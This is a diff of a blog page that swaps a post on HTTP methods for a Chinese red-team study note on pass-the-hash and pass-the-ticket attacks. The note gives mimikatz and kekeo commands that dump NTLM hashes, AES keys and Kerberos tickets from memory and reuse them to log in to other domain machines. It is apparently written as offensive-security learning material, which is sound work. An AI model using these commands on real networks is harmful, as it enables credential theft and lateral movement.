@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【经验总结】常见的HTTP方法, TeamsSix">
+    <meta name="keywords" content="【内网学习笔记】21、哈希传递与票据传递, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>【经验总结】常见的HTTP方法 | TeamsSix</title>
+    <title>【内网学习笔记】21、哈希传递与票据传递 | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -258,12 +258,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【经验总结】常见的HTTP方法</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】21、哈希传递与票据传递</h1>
                 </div>
             </div>
         </div>
@@ -380,12 +380,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
-                                <span class="chip bg-color">经验总结</span>
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">学习笔记</span>
                             </a>
                         
-                            <a href="/tags/HTTP%E6%96%B9%E6%B3%95/">
-                                <span class="chip bg-color">HTTP方法</span>
+                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
                             </a>
                         
                     </div>
@@ -396,8 +400,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
-                                经验总结
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                内网学习笔记
                             </a>
                         
                     </div>
@@ -409,28 +413,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-11-27
+                    2021-09-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-09-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    328
+                    761
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -445,26 +449,57 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p>
-<p>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</p>
-<p>HTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。</p>
-<a id="more"></a>
-<h1 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01 GET"></a>0x01 GET</h1><p>GET方法用于请求指定的页面信息，并返回实体主体。</p>
-<h1 id="0x02-HEAD"><a href="#0x02-HEAD" class="headerlink" title="0x02 HEAD"></a>0x02 HEAD</h1><p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。</p>
-<h1 id="0x03-POST"><a href="#0x03-POST" class="headerlink" title="0x03 POST"></a>0x03 POST</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。</p>
-<p>数据被包含在请求体中，POST请求可能会导致新的资源建立或已有资源的修改。</p>
-<h1 id="0x04-PUT"><a href="#0x04-PUT" class="headerlink" title="0x04 PUT"></a>0x04 PUT</h1><p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p>
-<h1 id="0x05-DELETE"><a href="#0x05-DELETE" class="headerlink" title="0x05 DELETE"></a>0x05 DELETE</h1><p>请求服务器删除指定的页面。</p>
-<h1 id="0x06-CONNECT"><a href="#0x06-CONNECT" class="headerlink" title="0x06 CONNECT"></a>0x06 CONNECT</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p>
-<h1 id="0x07-OPTIONS"><a href="#0x07-OPTIONS" class="headerlink" title="0x07 OPTIONS"></a>0x07 OPTIONS</h1><p>允许客户端查看服务器的性能。</p>
-<h1 id="0x08-TRACE"><a href="#0x08-TRACE" class="headerlink" title="0x08 TRACE"></a>0x08 TRACE</h1><p>回显服务器收到的请求，主要用于测试或诊断。</p>
-<h1 id="0x09-PATCH"><a href="#0x09-PATCH" class="headerlink" title="0x09 PATCH"></a>0x09 PATCH</h1><p>是对PUT方法的补充，用来对已知资源进行局部更新。</p>
+                <h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p>
+<p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p>
+<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p>
+<pre><code>privilege::debug
+sekurlsa::logonpasswords</code></pre>
+<p>在远程主机上以管理员权限打开 mimikatz</p>
+<pre><code>privilege::debug
+sekurlsa::pth /user:administrator /domain:teamssix.com /ntlm:161cff084477fe596a5db81874498a24</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901120511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p>
+<h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p>
+<pre><code>privilege::debug
+sekurlsa::ekeys</code></pre>
+<p>在其他远程计算机中，以管理员权限打开 mimikatz</p>
+<pre><code>privilege::debug
+sekurlsa::pth /user:administrator /domain:teamssix.com /aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60</code></pre>
+<p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p>
+<p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p>
+<p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p>
+<h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT），是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p>
+<pre><code>privilege::debug
+sekurlsa::tickets /export</code></pre>
+<p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p>
+<p>使用以下命令可以清除内存中的票据</p>
+<pre><code>kerberos::purge</code></pre>
+<p>将票据文件注入内存</p>
+<pre><code>kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;</code></pre>
+<p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901153402.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>票据传递除了用 mimikatz 还可以用 kekeo</p>
+<h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p>
+<pre><code>tgt::ask /user:administrator /domain:teamssix.com /ntlm:161cff084477fe596a5db81874498a24</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>在 kekeo 中清楚当前内存中的其他票据，不然可能会导致票据传递失败</p>
+<pre><code>kerberos::purge</code></pre>
+<p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p>
+<pre><code>klist purge</code></pre>
+<p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p>
+<pre><code>kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901155501.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>注意点：</p>
+<p>1、票据文件注入内存的默认有效时间为 10 小时</p>
+<p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p>
+<p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p>
 <blockquote>
-<p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a></p>
+<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<blockquote>
-<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-methods.html">https://www.runoob.com/http/http-methods.html</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods</a></p>
-</blockquote>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
 
             </div>
             <hr/>
@@ -490,7 +525,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/191127-201438.html">https://www.teamssix.com/191127-201438.html</a>
+                    <a href="https://www.teamssix.com/210901-160349.html">https://www.teamssix.com/210901-160349.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -528,12 +563,16 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
-                                    <span class="chip bg-color">经验总结</span>
+                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
-                                <a href="/tags/HTTP%E6%96%B9%E6%B3%95/">
-                                    <span class="chip bg-color">HTTP方法</span>
+                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                    <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
                                 </a>
                             
                         </div>
@@ -579,7 +618,7 @@
         owner: 'teamssix',
         proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
         admin: "teamssix",
-        id: '2019-11-27T20-14-38',
+        id: '2021-09-01T16-03-49',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -603,59 +642,56 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/191127-201443.html">
+                <a href="/210901-160349.html">
                     <div class="card-image">
                         
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png" class="responsive-img" alt="【内网学习笔记】21、哈希传递与票据传递">
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="【漏洞笔记】Host头攻击">
-                        
-                        <span class="card-title">【漏洞笔记】Host头攻击</span>
+                        <span class="card-title">【内网学习笔记】21、哈希传递与票据传递</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 概述漏洞名称：Host头攻击
-风险等级：低
-问题类型：管理员设置问题
-0x01 漏洞描述Host首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。
-
-运用虚拟主机技术，单个主机
+                            1、哈希传递哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。
+通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-11-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    漏洞笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">漏洞笔记</span>
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/">
-                        <span class="chip bg-color">管理员设置问题</span>
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                        <span class="chip bg-color">红队</span>
                     </a>
                     
-                    <a href="/tags/Host%E5%A4%B4/">
-                        <span class="chip bg-color">Host头</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
@@ -669,34 +705,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/191126-215809.html">
+                <a href="/210831-122611.html">
                     <div class="card-image">
                         
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png" class="responsive-img" alt="【内网学习笔记】20、Hashcat 的使用">
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="【漏洞笔记】ASP.NET允许文件调试">
-                        
-                        <span class="card-title">【漏洞笔记】ASP.NET允许文件调试</span>
+                        <span class="card-title">【内网学习笔记】20、Hashcat 的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 概述漏洞名称：ASP.NET允许文件调试
-风险等级：低
-问题类型：管理员设置问题
-0x01 漏洞描述发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密
+                            1、介绍Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。
+工具地址：https://hashcat.n
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-31
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    漏洞笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
@@ -706,16 +739,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">漏洞笔记</span>
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/ASP-NET/">
-                        <span class="chip bg-color">ASP.NET</span>
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                        <span class="chip bg-color">红队</span>
                     </a>
                     
-                    <a href="/tags/%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/">
-                        <span class="chip bg-color">管理员设置问题</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
